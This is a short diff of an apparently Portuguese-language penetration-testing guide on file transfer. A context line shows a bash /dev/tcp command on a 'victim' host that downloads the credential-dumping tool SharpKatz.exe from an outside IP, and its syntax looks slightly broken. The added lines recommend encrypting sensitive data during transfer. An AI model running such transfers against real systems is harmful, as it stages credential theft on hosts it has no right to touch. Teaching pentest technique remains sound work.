@@ -380,7 +380,9 @@ Escrever neste arquivo específico faz com que o Bash abra uma conexão TCP para
 victim@target:~$ cat < /dev/tcp/>10.10.15.156/8000 > SharpKatz.exe
 ```
 
+# Extras
 
+- Caso seja dados muito sensíveis para transferir, recomenda-se usar algum meio de criptografia.
 
 # 🛡️ Disclaimer 
 
